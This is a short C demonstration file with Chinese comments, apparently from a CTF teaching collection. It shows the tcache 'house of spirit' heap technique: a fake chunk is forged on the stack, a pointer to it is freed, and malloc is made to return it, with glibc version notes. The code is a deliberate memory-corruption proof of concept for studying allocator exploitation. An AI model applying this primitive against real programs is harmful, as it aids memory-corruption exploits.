/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_spirit
 * 文件标注范围：tcache ~ 2.26 ~ 2.43
 * 模拟漏洞：能 free 一个指向伪造 user area 的指针，并控制其前方 size 字段。
 * 核心流程：把栈/全局区伪造成合法 chunk 后 free；fastbin 版需处理 tcache 与 next-size，tcache 版只要求索引和对齐。
 * 成功判据：malloc 返回 fake chunk 的 user area。2.43 只封掉 fastbin 版，tcache 版仍成立。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	malloc(1);

	unsigned long long *a; // 这是被漏洞覆盖的原始指针，稍后将令它指向伪 chunk 的用户区。
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); // 在栈上预留并对齐伪 chunk 所需的内存区域。

	fake_chunks[1] = 0x40; // 写入伪 chunk 的 size 字段，使它属于目标 tcache 尺寸类。

	a = &fake_chunks[2];

	free(a);

	void *b = malloc(0x30);

	assert((long)b == (long)&fake_chunks[2]);
}
